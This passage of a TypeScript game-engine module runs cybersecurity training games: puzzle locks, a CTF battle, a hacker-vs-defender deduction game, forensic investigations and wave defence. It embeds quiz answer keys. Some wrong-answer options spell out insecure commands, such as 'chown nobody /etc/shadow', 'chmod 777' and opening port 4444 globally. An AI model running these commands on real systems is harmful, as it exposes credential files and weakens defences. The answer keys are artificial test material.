      artifact: 'header.payload.signature',
      hint: 'Count header, payload, signature.',
      acceptedAnswers: ['3'],
      points: 150,
    },
    {
      lockNumber: 3,
      title: 'Override 3 — Hex Magic Header',
      cipherType: 'Binary Forensics',
      prompt: 'What 3 ASCII letters begin an ELF executable magic header after byte 0x7F?',
      artifact: '7F ?? ?? ??',
      hint: 'Executable and Linkable Format.',
      acceptedAnswers: ['ELF'],
      points: 180,
    },
    {
      lockNumber: 4,
      title: 'Override 4 — Emergency Abort Token',
      cipherType: 'Base64',
      prompt: 'Decode QUJPUlQtMzk3Nw== to disarm the payload.',
      artifact: 'QUJPUlQtMzk3Nw==',
      hint: 'ABORT-3977',
      acceptedAnswers: ['ABORT-3977'],
      points: 220,
    },
  ],
};

const SOCIAL_TASKS: SocialTask[] = [
  {
    id: 'st-1',
    title: 'Rotate Compromised API Key',
    prompt: 'Select the secure protocol before issuing a fresh HMAC signing secret:',
    options: ['Invalidate old secret immediately and audit active tokens', 'Email old secret in plaintext', 'Disable TLS'],
    correctIndex: 0,
  },
  {
    id: 'st-2',
    title: 'Quarantine Rogue Reverse Shell',
    prompt: 'Which firewall rule stops outbound C2 callbacks from an infected container?',
    options: ['Allow all egress UDP', 'Apply default-deny egress policy on cluster namespace', 'Open port 4444 globally'],
    correctIndex: 1,
  },
  {
    id: 'st-3',
    title: 'Patch SUID Escalation Vector',
    prompt: 'Remove the unintended SUID bit from /usr/local/bin/diag-helper:',
    options: ['chmod u-s /usr/local/bin/diag-helper', 'chmod 777 /usr/local/bin/diag-helper', 'chown nobody /etc/shadow'],
    correctIndex: 0,
  },
  {
    id: 'st-4',
    title: 'Verify Audit Log Checksum',
    prompt: 'Confirm why immutable append-only audit logs matter during intrusion triage:',
    options: ['Attackers cannot erase entry traces post-compromise', 'They compress images faster', 'They bypass RBAC'],
    correctIndex: 0,
  },
  {
    id: 'st-5',
    title: 'Enforce MFA on Admin Console',
    prompt: 'Which second factor resists credential-stuffing attacks best?',
    options: ['TOTP / Hardware WebAuthn key', 'Security question: favorite color', '4-digit static PIN in localStorage'],
    correctIndex: 0,
  },
];

// ============================================================================
// SESSION INITIALIZER, ACTION DISPATCHER & SANITIZER
// ============================================================================

export function initializeGameSessionState(params: {
  engineType: GameEngineType;
  gameSlug: string;
  mode: string;
  players: PlayerDescriptor[];
  seed: string;
}): Record<string, unknown> {
  const { engineType, gameSlug, mode, players, seed } = params;

  if (engineType === 'social_deduction') {
    // In explicit solo practice mode, pair player with clearly labeled [AI Practice] nodes.
    // In all multiplayer modes, ONLY real human participants are in the roster.
    const roster =
      mode === 'solo' && players.length === 1
        ? [
            { ...players[0], isBot: false },
            { id: -101, username: 'bot_sentinel', displayName: 'Sentinel-01 [AI Practice]', side: 'solo', isBot: true },
            { id: -102, username: 'bot_cipher', displayName: 'Cipher-02 [AI Practice]', side: 'solo', isBot: true },
            { id: -103, username: 'bot_tracer', displayName: 'Tracer-03 [AI Practice]', side: 'solo', isBot: true },
            { id: -104, username: 'bot_relay', displayName: 'Relay-04 [AI Practice]', side: 'solo', isBot: true },
          ]
        : players.map((p) => ({ ...p, isBot: false }));

    // Deterministic seeded shuffle to select hacker(s)
    const numHackers = roster.length >= 6 ? 2 : 1;
    let hash = 0;
    for (let i = 0; i < seed.length; i++) hash = (hash * 31 + seed.charCodeAt(i)) >>> 0;

    const roles: Record<string, 'hacker' | 'defender'> = {};
    const indices = roster.map((_, i) => i);
    for (let i = indices.length - 1; i > 0; i--) {
      hash = (hash * 1664525 + 1013904223) >>> 0;
      const j = hash % (i + 1);
      [indices[i], indices[j]] = [indices[j], indices[i]];
    }
    // If solo practice mode, ensure human gets to experience either role fairly, or default hacker indices
    const hackerIdxSet = new Set(indices.slice(0, numHackers));
    roster.forEach((p, idx) => {
      roles[String(p.id)] = hackerIdxSet.has(idx) ? 'hacker' : 'defender';
    });

    const aliveIds = roster.map((p) => p.id);
    const taskTarget = Math.max(4, roster.filter((p) => roles[String(p.id)] === 'defender').length * 2);

    return {
      engineType,
      gameSlug,
      mode,
      phase: 'tasks',
      roundNumber: 1,
      roster,
      roles, // PRIVATE: never exposed raw to defenders!
      aliveIds,
      ejectedIds: [],
      ejectedRoles: {},
      tasksCompleted: 0,
      taskTarget,
      completedTaskIdsByPlayer: {},
      sabotagesTriggered: 0,
      sabotageTarget: 3,
      lastSabotageAt: 0,
      votes: {},
      winnerTeam: null as 'defenders' | 'hackers' | null,
      timeline: [`Match initialized with ${roster.length} operators and ${numHackers} hidden infiltrator(s).`],
    };
  }

  if (engineType === 'cyber_battle') {
    const questions = BATTLE_BANKS[gameSlug] || BATTLE_BANKS['cyber-ctf-battle'];
    return {
      engineType,
      gameSlug,
      mode,
      questions, // PRIVATE: stripped before sending to clients!
      playerProgress: Object.fromEntries(
        players.map((p) => [
          String(p.id),
          {
            solvedIds: [] as string[],
            hintsUsedIds: [] as string[],
            attempts: 0,
            correctAttempts: 0,
            score: 0,
            finished: false,
          },
        ]),
      ),
      winnerUserId: null as number | null,
      timeline: [`${questions.length} server-verified battle rounds deployed.`],
    };
  }

  if (engineType === 'investigation') {
    const caseData = INVESTIGATION_CASES[gameSlug] || INVESTIGATION_CASES['cyber-detective'];
    return {
      engineType,
      gameSlug,
      mode,
      caseData, // PRIVATE answers stripped in sanitizer
      unlockedCluesByUser: {} as Record<string, string[]>,
      submissionsByUser: {} as Record<
        string,
        {
          suspect: string;
          vector: string;
          remediation: string;
          accuracyPct: number;
          score: number;
          submittedAt: string;
        }
      >,
      timeline: [`Case ${caseData.caseCode} opened: ${caseData.title}`],
    };
  }

  if (engineType === 'strategy_survival') {
    return {
      engineType,
      gameSlug,
      mode,
      waves: STRATEGY_WAVES,
      playerStates: Object.fromEntries(
        players.map((p) => [
          String(p.id),
          {
            waveIndex: 0,
            integrity: 100,
            budget: 100,
            score: 0,
            completed: false,
            failed: false,
            waveHistory: [] as Array<{
              wave: number;
              threatName: string;
              allocation: Record<string, number>;
              mitigatedPct: number;
              damageTaken: number;
              integrityAfter: number;
            }>,
          },
        ]),
      ),
      timeline: ['Cyber defense command initialized. 4 incoming threat waves detected.'],
    };
  }

  // adventure_puzzle
  const locks = PUZZLE_BANKS[gameSlug] || PUZZLE_BANKS['cyber-escape-room'];
  return {
    engineType: 'adventure_puzzle',
    gameSlug,
    mode,
    locks, // PRIVATE answers stripped
    sharedLockIndex: 0,
    hintsUsedByUser: {} as Record<string, number[]>,
    playerProgress: Object.fromEntries(
      players.map((p) => [
        String(p.id),
        {
          unlockedCount: 0,
          attempts: 0,
          correctAttempts: 0,
          score: 0,
          escaped: false,
        },
      ]),
    ),
    timeline: [`Security vault sealed (${locks.length} sequential locks).`],
  };
}

export interface EngineActionResult {
  valid: boolean;
  pointsAwarded: number;
  feedback: string;
  matchEnded: boolean;
  nextState: Record<string, unknown>;
}

export function applyGameEngineAction(params: {
  state: Record<string, unknown>;
  userId: number;
  displayName: string;
  eventType: string;
  payload: Record<string, unknown>;
  elapsedSeconds: number;
}): EngineActionResult {
  const { state, userId, displayName, eventType, payload, elapsedSeconds } = params;
  const next = JSON.parse(JSON.stringify(state)) as Record<string, unknown>;
  const engineType = String(next.engineType);

  // ------------------------------------------------------------------------
  // 1. SOCIAL DEDUCTION (Hacker Among Us, Spy Network, Campus Mafia, etc.)
  // ------------------------------------------------------------------------
  if (engineType === 'social_deduction') {
    if (next.winnerTeam) {
      return { valid: false, pointsAwarded: 0, feedback: 'Match already concluded.', matchEnded: true, nextState: next };
    }
    const roles = next.roles as Record<string, 'hacker' | 'defender'>;
    const aliveIds = next.aliveIds as number[];
    const ejectedIds = next.ejectedIds as number[];
    const ejectedRoles = next.ejectedRoles as Record<string, string>;
    const roster = next.roster as Array<{ id: number; displayName: string; isBot?: boolean }>;
    const timeline = next.timeline as string[];
    const myRole = roles[String(userId)];

    if (!aliveIds.includes(userId)) {
      return { valid: false, pointsAwarded: 0, feedback: 'Eliminated operators cannot execute actions.', matchEnded: false, nextState: next };
    }

    const checkSocialWin = (): boolean => {
      const currentAlive = next.aliveIds as number[];
      const aliveHackers = currentAlive.filter((id) => roles[String(id)] === 'hacker');
      const aliveDefenders = currentAlive.filter((id) => roles[String(id)] === 'defender');
      if (aliveHackers.length === 0) {
        next.winnerTeam = 'defenders';
        timeline.push('VICTORY: All hidden infiltrators neutralized! Defenders win.');
        return true;
      }
      if ((next.tasksCompleted as number) >= (next.taskTarget as number)) {
        next.winnerTeam = 'defenders';
        timeline.push('VICTORY: Cluster hardening tasks 100% completed! Defenders win.');
        return true;
      }
      if ((next.sabotagesTriggered as number) >= (next.sabotageTarget as number)) {
        next.winnerTeam = 'hackers';
        timeline.push('BREACH: Critical sabotage threshold reached! Hackers win.');
        return true;
      }
      if (aliveHackers.length >= aliveDefenders.length && roster.length > 2) {
        next.winnerTeam = 'hackers';
        timeline.push('BREACH: Infiltrators achieved voting parity! Hackers win.');
        return true;
      }
      return false;
    };

    if (eventType === 'complete_task') {
      if (next.phase !== 'tasks') {
        return { valid: false, pointsAwarded: 0, feedback: 'Tasks paused during emergency meeting.', matchEnded: false, nextState: next };
      }
      if (myRole !== 'defender') {
        return { valid: false, pointsAwarded: 0, feedback: 'Hackers cannot submit genuine defender tasks; use Sabotage or Call Meeting.', matchEnded: false, nextState: next };
      }
      const taskId = String(payload.taskId || '');
      const selectedOption = Number(payload.selectedOption);
      const task = SOCIAL_TASKS.find((t) => t.id === taskId);
      if (!task) {
        return { valid: false, pointsAwarded: 0, feedback: 'Unknown security task.', matchEnded: false, nextState: next };
      }
      const mapByPlayer = next.completedTaskIdsByPlayer as Record<string, string[]>;
      const done = mapByPlayer[String(userId)] || [];
      if (done.includes(taskId)) {
        return { valid: false, pointsAwarded: 0, feedback: 'You already verified this task.', matchEnded: false, nextState: next };
      }
      if (selectedOption !== task.correctIndex) {
        timeline.push(`${displayName} misconfigured ${task.title}.`);
        return { valid: true, pointsAwarded: 0, feedback: 'Incorrect remediation! Try again carefully.', matchEnded: false, nextState: next };
      }
      done.push(taskId);
      mapByPlayer[String(userId)] = done;
      next.tasksCompleted = Number(next.tasksCompleted || 0) + 1;

      // In solo practice mode, practice bots simulate task/sabotage tension cleanly on server turn
      if (next.mode === 'solo') {
        const botHacker = roster.find((r) => r.isBot && aliveIds.includes(r.id) && roles[String(r.id)] === 'hacker');
        if (botHacker && Number(next.tasksCompleted) % 2 === 0 && Number(next.sabotagesTriggered) < Number(next.sabotageTarget) - 1) {
          next.sabotagesTriggered = Number(next.sabotagesTriggered || 0) + 1;
          timeline.push('ALERT: Rogue telemetry spike detected — possible sabotage in progress!');
        }
      }

      const ended = checkSocialWin();
      return {
        valid: true,
        pointsAwarded: 60,
        feedback: `Task verified: ${task.title} (+60 pts)`,
        matchEnded: ended,
        nextState: next,
      };
    }

    if (eventType === 'sabotage') {
      if (next.phase !== 'tasks') {
        return { valid: false, pointsAwarded: 0, feedback: 'Cannot sabotage during an active meeting.', matchEnded: false, nextState: next };
      }
      if (myRole !== 'hacker') {
        return { valid: false, pointsAwarded: 0, feedback: 'Only hidden hackers can trigger sabotage.', matchEnded: false, nextState: next };
      }
      const nowMs = Date.now();
      if (nowMs - Number(next.lastSabotageAt || 0) < 8000) {
        return { valid: false, pointsAwarded: 0, feedback: 'Sabotage cooldown active (8s).', matchEnded: false, nextState: next };
      }
      next.lastSabotageAt = nowMs;
      next.sabotagesTriggered = Number(next.sabotagesTriggered || 0) + 1;
      const targetSystem = String(payload.system || 'Auth Gateway');
      timeline.push(`SABOTAGE ALERT: ${targetSystem} disrupted (${next.sabotagesTriggered}/${next.sabotageTarget})!`);
      const ended = checkSocialWin();
      return {
        valid: true,
        pointsAwarded: 90,
        feedback: `Sabotage executed on ${targetSystem} (+90 pts)`,
        matchEnded: ended,
        nextState: next,
      };
    }

    if (eventType === 'call_meeting') {
      if (next.phase === 'meeting') {
        return { valid: false, pointsAwarded: 0, feedback: 'Emergency meeting already in session.', matchEnded: false, nextState: next };
      }
      next.phase = 'meeting';
      next.votes = {};
      timeline.push(`EMERGENCY MEETING called by ${displayName}! Discuss evidence and cast votes.`);
      return {
        valid: true,
        pointsAwarded: 15,
        feedback: 'Emergency meeting convened.',
        matchEnded: false,
        nextState: next,
      };
    }

    if (eventType === 'cast_vote') {
      if (next.phase !== 'meeting') {
        return { valid: false, pointsAwarded: 0, feedback: 'Voting is only open during emergency meetings.', matchEnded: false, nextState: next };
      }
      const targetId = payload.targetId === 'skip' ? 'skip' : Number(payload.targetId);
      if (targetId !== 'skip' && !aliveIds.includes(targetId)) {
        return { valid: false, pointsAwarded: 0, feedback: 'Invalid vote target.', matchEnded: false, nextState: next };
      }
      const votes = next.votes as Record<string, string | number>;
      votes[String(userId)] = targetId;

      // In solo practice mode, alive AI bots cast deterministic deduction votes once human votes
      if (next.mode === 'solo') {
        for (const bot of roster) {
          if (bot.isBot && aliveIds.includes(bot.id) && !votes[String(bot.id)]) {
            const candidates = aliveIds.filter((id) => id !== bot.id);
            const hackerTarget = candidates.find((id) => roles[String(id)] === 'hacker');
            votes[String(bot.id)] =
              roles[String(bot.id)] === 'defender' && hackerTarget && Number(next.roundNumber) >= 1
                ? hackerTarget
                : candidates[0] ?? 'skip';
          }
        }
      }

      // Check if all alive players have voted (or resolve immediately if majority reached)
      const humanAliveIds = aliveIds.filter((id) => !roster.find((r) => r.id === id)?.isBot);
      const allHumansVoted = humanAliveIds.every((id) => votes[String(id)] !== undefined);
      const allAliveVoted = aliveIds.every((id) => votes[String(id)] !== undefined);

      if (allAliveVoted || (next.mode === 'solo' && allHumansVoted)) {
        const tally = new Map<string, number>();
        for (const v of Object.values(votes)) {
          const key = String(v);
          tally.set(key, (tally.get(key) || 0) + 1);
        }
        let topKey = 'skip';
        let topCount = 0;
        let tie = false;
        for (const [k, count] of tally.entries()) {
          if (count > topCount) {
            topKey = k;
            topCount = count;
            tie = false;
          } else if (count === topCount) {
            tie = true;
          }
        }

        if (!tie && topKey !== 'skip') {
          const ejectedId = Number(topKey);
          const ejectedUser = roster.find((r) => r.id === ejectedId);
          next.aliveIds = aliveIds.filter((id) => id !== ejectedId);
          ejectedIds.push(ejectedId);
          ejectedRoles[String(ejectedId)] = roles[String(ejectedId)];
          timeline.push(
            `TRIBUNAL RESULT: ${ejectedUser?.displayName || 'Operator'} was ejected (${roles[String(ejectedId)].toUpperCase()}).`,
          );
        } else {
          timeline.push('TRIBUNAL RESULT: No consensus (skip/tie). Returning to operations.');
        }

        next.phase = 'tasks';
        next.roundNumber = Number(next.roundNumber || 1) + 1;
        next.votes = {};
        const ended = checkSocialWin();
        const bonus = !tie && topKey !== 'skip' && roles[topKey] === 'hacker' ? 120 : 25;
        return {
          valid: true,
          pointsAwarded: bonus,
          feedback: ended ? 'Tribunal resolved — match complete!' : 'Votes tallied — operations resumed.',
          matchEnded: ended,
          nextState: next,
        };
      }

      return {
        valid: true,
        pointsAwarded: 10,
        feedback: 'Vote recorded. Waiting for remaining active operators.',
        matchEnded: false,
        nextState: next,
      };
    }

    return { valid: false, pointsAwarded: 0, feedback: 'Unsupported social deduction event.', matchEnded: false, nextState: next };
  }

  // ------------------------------------------------------------------------
  // 2. CYBER BATTLE & SKILL/SPEED ENGINE
  // ------------------------------------------------------------------------
  if (engineType === 'cyber_battle') {
    const questions = next.questions as BattleQuestion[];
    const progressMap = next.playerProgress as Record<
      string,
      {
        solvedIds: string[];
        hintsUsedIds: string[];
        attempts: number;
        correctAttempts: number;
        score: number;
        finished: boolean;
      }
    >;
    const timeline = next.timeline as string[];

    if (!progressMap[String(userId)]) {
      progressMap[String(userId)] = { solvedIds: [], hintsUsedIds: [], attempts: 0, correctAttempts: 0, score: 0, finished: false };
    }
    const pState = progressMap[String(userId)];

    if (eventType === 'request_hint') {
      const qId = String(payload.questionId || '');
      const q = questions.find((item) => item.id === qId);
      if (!q) return { valid: false, pointsAwarded: 0, feedback: 'Round not found.', matchEnded: false, nextState: next };
      if (!pState.hintsUsedIds.includes(qId)) pState.hintsUsedIds.push(qId);
      return { valid: true, pointsAwarded: 0, feedback: `Hint unlocked: ${q.hint}`, matchEnded: false, nextState: next };
    }

    if (eventType === 'submit_answer') {
      const qId = String(payload.questionId || '');
      const answer = String(payload.answer || '').trim().toLowerCase();
      const q = questions.find((item) => item.id === qId);
      if (!q) return { valid: false, pointsAwarded: 0, feedback: 'Invalid battle round.', matchEnded: false, nextState: next };
      if (pState.solvedIds.includes(qId)) {
        return { valid: false, pointsAwarded: 0, feedback: 'Round already solved.', matchEnded: false, nextState: next };
      }

      pState.attempts += 1;
      const isCorrect = q.acceptedAnswers.some((a) => a.trim().toLowerCase() === answer);
      if (!isCorrect) {
        return {
          valid: true,
          pointsAwarded: 0,
          feedback: 'Verification failed — inspect the artifact and try again.',
          matchEnded: false,
          nextState: next,
        };
      }

      pState.correctAttempts += 1;
      pState.solvedIds.push(qId);
      const speedBonus = Math.max(0, Math.round(60 - Math.min(60, elapsedSeconds * 0.15)));
      const hintPenalty = pState.hintsUsedIds.includes(qId) ? 25 : 0;
      const awarded = Math.max(50, q.points + speedBonus - hintPenalty);
      pState.score += awarded;
      timeline.push(`${displayName} solved "${q.title}" (+${awarded} pts).`);

      const completedAll = pState.solvedIds.length >= questions.length;
      if (completedAll) {
        pState.finished = true;
        if (!next.winnerUserId) next.winnerUserId = userId;
      }

      const everyoneDone = Object.values(progressMap).every((st) => st.finished);
      const matchEnded = next.mode === 'solo' ? completedAll : everyoneDone || completedAll;
      return {
        valid: true,
        pointsAwarded: awarded,
        feedback: `Verified! ${q.explanation} (+${awarded} pts)`,
        matchEnded,
        nextState: next,
      };
    }

    return { valid: false, pointsAwarded: 0, feedback: 'Unsupported battle event.', matchEnded: false, nextState: next };
  }

  // ------------------------------------------------------------------------
  // 3. INVESTIGATION / MYSTERY ENGINE (Cyber Detective, etc.)
  // ------------------------------------------------------------------------
  if (engineType === 'investigation') {
    const caseData = next.caseData as InvestigationCase;
    const unlockedByUser = next.unlockedCluesByUser as Record<string, string[]>;
    const submissionsByUser = next.submissionsByUser as Record<
      string,
      { suspect: string; vector: string; remediation: string; accuracyPct: number; score: number; submittedAt: string }
    >;
    const timeline = next.timeline as string[];

    if (eventType === 'unlock_clue') {
      const exhibitId = String(payload.exhibitId || '');
      const exhibit = caseData.exhibits.find((e) => e.id === exhibitId);
      if (!exhibit) return { valid: false, pointsAwarded: 0, feedback: 'Exhibit not found.', matchEnded: false, nextState: next };
      const list = unlockedByUser[String(userId)] || [];
      if (!list.includes(exhibitId)) list.push(exhibitId);
      unlockedByUser[String(userId)] = list;
      timeline.push(`${displayName} uncovered forensic exhibit: ${exhibit.label}.`);
      return {
        valid: true,
        pointsAwarded: 20,
        feedback: `Forensic lead unlocked: ${exhibit.label}.`,
        matchEnded: false,
        nextState: next,
      };
    }

    if (eventType === 'submit_case') {
      if (submissionsByUser[String(userId)]) {
        return { valid: false, pointsAwarded: 0, feedback: 'Final forensic verdict already filed.', matchEnded: false, nextState: next };
      }
      const suspect = String(payload.suspect || '');
      const vector = String(payload.vector || '');
      const remediation = String(payload.remediation || '');

      let hits = 0;
      if (suspect === caseData.correctSuspect) hits += 1;
      if (vector === caseData.correctVector) hits += 1;
      if (remediation === caseData.correctRemediation) hits += 1;

      const accuracyPct = Math.round((hits / 3) * 100);
      const cluesUsed = (unlockedByUser[String(userId)] || []).length;
      const basePts = hits * 140;
      const clueEfficiency = Math.max(0, 60 - cluesUsed * 15);
      const score = Math.max(25, basePts + (hits === 3 ? clueEfficiency : 0));

      submissionsByUser[String(userId)] = {
        suspect,
        vector,
        remediation,
        accuracyPct,
        score,
        submittedAt: new Date().toISOString(),
      };
      timeline.push(`${displayName} filed verdict (${accuracyPct}% forensic accuracy, ${score} pts).`);

      const matchEnded = next.mode === 'solo' || Object.keys(submissionsByUser).length >= 1;
      return {
        valid: true,
        pointsAwarded: score,
        feedback:
          hits === 3
            ? `Case Solved (100%): ${caseData.resolutionSummary}`
            : `Case Filed (${accuracyPct}% match): ${caseData.resolutionSummary}`,
        matchEnded,
        nextState: next,
      };
    }

    return { valid: false, pointsAwarded: 0, feedback: 'Unsupported investigation event.', matchEnded: false, nextState: next };
  }

  // ------------------------------------------------------------------------
  // 4. STRATEGY & SURVIVAL ENGINE (Cyber War, Build Your Firewall, etc.)
  // ------------------------------------------------------------------------
  if (engineType === 'strategy_survival') {
    const waves = next.waves as StrategyWave[];
    const playerStates = next.playerStates as Record<
      string,
      {
        waveIndex: number;
        integrity: number;
        budget: number;
        score: number;
        completed: boolean;
        failed: boolean;
        waveHistory: Array<Record<string, unknown>>;
      }
    >;
    const timeline = next.timeline as string[];
    const pState = playerStates[String(userId)];
    if (!pState) return { valid: false, pointsAwarded: 0, feedback: 'Commander state missing.', matchEnded: false, nextState: next };
    if (pState.completed || pState.failed) {
      return { valid: false, pointsAwarded: 0, feedback: 'Your defense campaign has already concluded.', matchEnded: false, nextState: next };
    }

    if (eventType === 'deploy_wave') {
      const waveDef = waves[pState.waveIndex];
      if (!waveDef) {
        return { valid: false, pointsAwarded: 0, feedback: 'All waves already resolved.', matchEnded: true, nextState: next };
      }

      const firewall = Math.max(0, Math.min(40, Number(payload.firewall || 0)));
      const ids = Math.max(0, Math.min(40, Number(payload.ids || 0)));
      const patching = Math.max(0, Math.min(40, Number(payload.patching || 0)));
      const deception = Math.max(0, Math.min(40, Number(payload.deception || 0)));
      const totalSpent = firewall + ids + patching + deception;
      if (totalSpent <= 0 || totalSpent > pState.budget) {
        return {
          valid: false,
          pointsAwarded: 0,
          feedback: `Allocate between 1 and ${pState.budget} energy credits.`,
          matchEnded: false,
          nextState: next,
        };
      }

      const allocation = { firewall, ids, patching, deception };
      const matchedSpend = allocation[waveDef.recommendedControl];
      const mitigationRaw = matchedSpend * 2.1 + (totalSpent - matchedSpend) * 0.7;
      const mitigatedPct = Math.min(95, Math.round((mitigationRaw / (waveDef.severity * 1.4)) * 100));
      const damageTaken = Math.max(2, Math.round(waveDef.severity * (1 - mitigatedPct / 100)));

      pState.integrity = Math.max(0, pState.integrity - damageTaken);
      pState.budget = Math.min(120, pState.budget - totalSpent + 35); // wave regen
      const wavePoints = Math.max(20, mitigatedPct * 2 + (matchedSpend >= 15 ? 40 : 0));
      pState.score += wavePoints;
      pState.waveHistory.push({
        wave: waveDef.wave,
        threatName: waveDef.threatName,
        allocation,
        mitigatedPct,
        damageTaken,
        integrityAfter: pState.integrity,
      });

      pState.waveIndex += 1;
      if (pState.integrity <= 0) {
        pState.failed = true;
        timeline.push(`${displayName} fell during Wave ${waveDef.wave} (${waveDef.threatName}).`);
      } else if (pState.waveIndex >= waves.length) {
        pState.completed = true;
        pState.score += pState.integrity * 2;
        timeline.push(`${displayName} survived all ${waves.length} waves with ${pState.integrity}% integrity!`);
      } else {
        timeline.push(`${displayName} mitigated ${mitigatedPct}% of Wave ${waveDef.wave} (${waveDef.threatName}).`);
      }

      const allDone = Object.values(playerStates).every((s) => s.completed || s.failed);
      return {
        valid: true,
        pointsAwarded: wavePoints,
        feedback: `Wave ${waveDef.wave} resolved: ${mitigatedPct}% mitigated, -${damageTaken}% integrity.`,
        matchEnded: allDone,
        nextState: next,
      };
    }

    return { valid: false, pointsAwarded: 0, feedback: 'Unsupported strategy event.', matchEnded: false, nextState: next };
  }

  // ------------------------------------------------------------------------
  // 5. ADVENTURE & PUZZLE ENGINE (Cyber Escape Room, Decode The Message, etc.)
  // ------------------------------------------------------------------------
  const locks = next.locks as PuzzleLock[];
  const progressMap = next.playerProgress as Record<
    string,
    { unlockedCount: number; attempts: number; correctAttempts: number; score: number; escaped: boolean }
  >;
  const hintsUsedByUser = next.hintsUsedByUser as Record<string, number[]>;
  const timeline = next.timeline as string[];

  if (!progressMap[String(userId)]) {
    progressMap[String(userId)] = { unlockedCount: 0, attempts: 0, correctAttempts: 0, score: 0, escaped: false };
  }
  const pState = progressMap[String(userId)];

  if (eventType === 'request_hint') {
    const lockNum = Number(payload.lockNumber);
    const lock = locks.find((l) => l.lockNumber === lockNum);
    if (!lock) return { valid: false, pointsAwarded: 0, feedback: 'Lock not found.', matchEnded: false, nextState: next };
    const used = hintsUsedByUser[String(userId)] || [];
    if (!used.includes(lockNum)) used.push(lockNum);
    hintsUsedByUser[String(userId)] = used;
    return { valid: true, pointsAwarded: 0, feedback: `Lock ${lockNum} Hint: ${lock.hint}`, matchEnded: false, nextState: next };
  }

  if (eventType === 'submit_lock') {
    const lockNum = Number(payload.lockNumber);
    const currentAllowedIndex = next.mode === 'coop' ? Number(next.sharedLockIndex || 0) : pState.unlockedCount;
    const expectedLock = locks[currentAllowedIndex];
    if (!expectedLock || expectedLock.lockNumber !== lockNum) {
      return { valid: false, pointsAwarded: 0, feedback: 'Unlock chambers sequentially from the current active lock.', matchEnded: false, nextState: next };
    }

    const answer = String(payload.answer || '').trim().toLowerCase();
    pState.attempts += 1;
    const ok = expectedLock.acceptedAnswers.some((a) => a.trim().toLowerCase() === answer);
    if (!ok) {
      return { valid: true, pointsAwarded: 0, feedback: 'Lock rejected keycode. Re-check cipher logic.', matchEnded: false, nextState: next };
    }

    pState.correctAttempts += 1;
    const hintPenalty = (hintsUsedByUser[String(userId)] || []).includes(lockNum) ? 25 : 0;
    const awarded = Math.max(50, expectedLock.points - hintPenalty);
    pState.score += awarded;

    if (next.mode === 'coop') {
      next.sharedLockIndex = Number(next.sharedLockIndex || 0) + 1;
      for (const st of Object.values(progressMap)) {
        st.unlockedCount = Number(next.sharedLockIndex);
        if (st.unlockedCount >= locks.length) st.escaped = true;
      }
    } else {
      pState.unlockedCount += 1;
      if (pState.unlockedCount >= locks.length) pState.escaped = true;
    }

    timeline.push(`${displayName} unlocked ${expectedLock.title} (+${awarded} pts).`);
    const everyoneEscaped = Object.values(progressMap).every((st) => st.escaped);
    const matchEnded = next.mode === 'coop' ? Number(next.sharedLockIndex) >= locks.length : pState.escaped || everyoneEscaped;
    return {
      valid: true,
      pointsAwarded: awarded,
      feedback: pState.escaped ? `Chamber Cleared! Vault escaped (+${awarded} pts)` : `Lock ${lockNum} disengaged (+${awarded} pts)`,
      matchEnded,
      nextState: next,
    };
  }

  return { valid: false, pointsAwarded: 0, feedback: 'Unsupported puzzle event.', matchEnded: false, nextState: next };
}

// ============================================================================
// STRICT PLAYER VIEW SANITIZER (STRIP SECRETS, FLAGS, & OTHER PLAYERS' ROLES)
// ============================================================================

export function sanitizeSessionForPlayer(
  rawState: Record<string, unknown>,
  requestingUserId: number | null,
  sessionStatus: string,
): Record<string, unknown> {
  const engineType = String(rawState.engineType);
  const completed = sessionStatus === 'completed';

  if (engineType === 'social_deduction') {
    const roles = (rawState.roles || {}) as Record<string, 'hacker' | 'defender'>;
    const myRole = requestingUserId ? roles[String(requestingUserId)] || 'spectator' : 'spectator';
    return {
      engineType,
      gameSlug: rawState.gameSlug,
      mode: rawState.mode,
      phase: rawState.phase,
      roundNumber: rawState.roundNumber,
      roster: rawState.roster,
      myRole,
      // Only reveal fellow hackers to a hacker, or reveal everyone once match is completed!
      revealedRoles: completed
        ? roles
        : myRole === 'hacker'
          ? Object.fromEntries(Object.entries(roles).filter(([, r]) => r === 'hacker'))
          : (rawState.ejectedRoles as Record<string, string>),
      ejectedRoles: rawState.ejectedRoles,
      aliveIds: rawState.aliveIds,
      ejectedIds: rawState.ejectedIds,
      tasksCompleted: rawState.tasksCompleted,
      taskTarget: rawState.taskTarget,
      completedTaskIds: requestingUserId
        ? ((rawState.completedTaskIdsByPlayer as Record<string, string[]>)?.[String(requestingUserId)] || [])
        : [],
      availableTasks: SOCIAL_TASKS,
      sabotagesTriggered: rawState.sabotagesTriggered,
      sabotageTarget: rawState.sabotageTarget,
      votes: rawState.votes,
      winnerTeam: rawState.winnerTeam,
      timeline: rawState.timeline,
    };
  }

  if (engineType === 'cyber_battle') {
    const questions = (rawState.questions || []) as BattleQuestion[];
    const progressMap = (rawState.playerProgress || {}) as Record<string, { hintsUsedIds: string[]; solvedIds: string[]; score: number; finished: boolean; attempts: number; correctAttempts: number }>;
    const myProg = requestingUserId ? progressMap[String(requestingUserId)] : null;
    return {
      engineType,
      gameSlug: rawState.gameSlug,
      mode: rawState.mode,
      questions: questions.map((q) => ({
        id: q.id,
        title: q.title,
        category: q.category,
        prompt: q.prompt,
        artifact: q.artifact,
        points: q.points,
        hint: myProg?.hintsUsedIds.includes(q.id) || completed ? q.hint : null,
        explanation: myProg?.solvedIds.includes(q.id) || completed ? q.explanation : null,
      })),
      myProgress: myProg,
      winnerUserId: rawState.winnerUserId,
      timeline: rawState.timeline,
    };
  }

  if (engineType === 'investigation') {
    const caseData = rawState.caseData as InvestigationCase;
    const unlockedMap = (rawState.unlockedCluesByUser || {}) as Record<string, string[]>;
    const myUnlocked = requestingUserId ? unlockedMap[String(requestingUserId)] || [] : [];
    const submissionsMap = (rawState.submissionsByUser || {}) as Record<string, unknown>;
    return {
      engineType,
      gameSlug: rawState.gameSlug,
      mode: rawState.mode,
      caseInfo: {
        caseCode: caseData.caseCode,
        title: caseData.title,
        briefing: caseData.briefing,
        suspectOptions: caseData.suspectOptions,
        vectorOptions: caseData.vectorOptions,
        remediationOptions: caseData.remediationOptions,
        exhibits: caseData.exhibits.map((ex) => ({
          id: ex.id,
          label: ex.label,
          source: ex.source,
          clueCost: ex.clueCost,
          isClue: Boolean(ex.isClue),
          locked: Boolean(ex.isClue && !myUnlocked.includes(ex.id) && !completed),
          content: !ex.isClue || myUnlocked.includes(ex.id) || completed ? ex.content : 'Locked clue — unlock to inspect telemetry.',
        })),
        resolutionSummary: completed || (requestingUserId && submissionsMap[String(requestingUserId)]) ? caseData.resolutionSummary : null,
      },
